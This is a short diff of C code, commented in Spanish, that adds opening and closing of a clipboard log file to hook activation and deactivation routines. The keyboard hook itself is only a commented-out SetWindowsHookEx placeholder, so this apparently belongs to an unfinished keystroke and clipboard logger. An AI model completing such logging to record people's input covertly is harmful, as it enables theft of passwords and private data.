@@ -10,6 +10,12 @@ BOOL ActivateHook(void)
         return FALSE;
     }
 
+    // Intenta abrir/crear el archivo log del clipboard
+    if (!OpenClipboardLog()) {
+        printf("No se puedo abrir el log del clipboard.\n");
+        return FALSE;
+    }
+
     // Aquí iría la instalación del hook de teclado (aún por implementar)
     // g_winkeyState.keyboardHook = SetWindowsHookEx(...);
 
@@ -32,4 +38,5 @@ void DeactivateHook(void)
         fclose(g_winkeyState.logFile);
         g_winkeyState.logFile = NULL;
     }
+    CloseClipboardLog();
 }
